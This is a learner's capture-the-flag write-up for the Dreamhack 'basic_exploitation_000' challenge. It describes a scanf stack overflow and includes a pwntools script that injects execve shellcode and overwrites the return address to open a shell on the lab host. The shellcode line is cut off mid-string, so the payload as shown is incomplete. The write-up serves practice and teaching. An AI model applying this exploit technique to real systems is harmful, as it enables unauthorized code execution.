# Dreamhack : basic_exploitation_000

[ Author : L1ya ]  

**1. Analysis**  

This code gives us the buf’s address, but this address is not constant.  

So, we have to use ‘recvuntil’ and ‘recvline’ to get address.  

And we input shellcode to bypass scanf.  

The distance of buf to return is 132. (buf size 0x80, ebp size 0x4)  

Use len(), we can get A’s number easily.  

And input buf’s address, we can get flag.  

**2. Vulnerabilities**  

Buf’s size is 0x80, but we can get 141 letters to scanf.  

**3. Exploitation**  

```python  
from pwn import *  

p = remote("host8.dreamhack.games", 22885)  

p.recvuntil(b"buf = ")  
buf = eval(p.recvline())  

shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\>  
payload = shellcode + b"A" * (132 - len(shellcode))  
payload += p32(buf)  

p.send(payload)  
p.interactive()  
```

**4. Result**  

[▘] Opening connection to host8.dreamhack.games on port 22885: Trying 158.24[+] Opening connection to host8.dreamhack.games on port 22885: Done  
[*] Switching to interactive mode  
$ flag  
$ cat flag  
DH{flag}  
[*] Got EOF while reading in interactive  

 [ NOTE ]  

I can know about shellcode more exactly.  

I could know more commands.(eval(p.recvline()), len())  

I couldn’t solve this problem on my own and saw write-up, but it is not a bad choice.  
